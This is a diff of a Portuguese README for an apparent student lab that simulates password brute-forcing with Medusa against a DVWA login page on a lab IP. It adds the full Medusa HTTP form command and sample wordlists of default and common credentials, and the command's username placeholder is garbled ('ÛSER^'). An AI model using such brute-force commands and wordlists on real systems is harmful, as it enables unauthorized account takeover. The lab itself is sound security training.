@@ -30,8 +30,14 @@ Para que o Medusa saiba que o login falhou, identificamos que a aplicação reto
 
 3. Execução com Medusa
 O comando utilizado simulou as interações que um usuário teria no navegador, mas de forma automatizada.
+```
+medusa -h 172.30.0.101 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=ÛSER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+```
 
-![execucao-com-medusa](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/imagens/execuca-com-medusa.png)
+![execucao-com-medusa](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/imagens/execucao-com-medusa.png)
 
 --------------------------------------------------------------------------------
 📂 Cenário 2: Força Bruta em FTP e SMB
@@ -40,6 +46,23 @@ O comando utilizado simulou as interações que um usuário teria no navegador, 
 --------------------------------------------------------------------------------
 📊 Resultados e Validação
 - Wordlists utilizadas: Listas simples com combinações de usuários e senhas comuns.
+
+
+![Usuários](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/wordlists/users.txt)
+```
+  msfadmin
+  admin
+  root
+```
+
+![Senhas](https://github.com/adrianosalves/simulando-ataque-brute-force-de-senhas-KaliLinux/blob/main/wordlists/pass.txt)
+```
+  123456
+  password
+  qwerty
+  msfadmin
+```
+
 - Sucesso: Descrição de qual credencial foi capturada (ex: admin/password).
 - Impacto: Se não mitigado, esse ataque pode levar ao comprometimento total do sistema, especialmente se o painelacessado for de administração ou controle de infraestrutura.
 
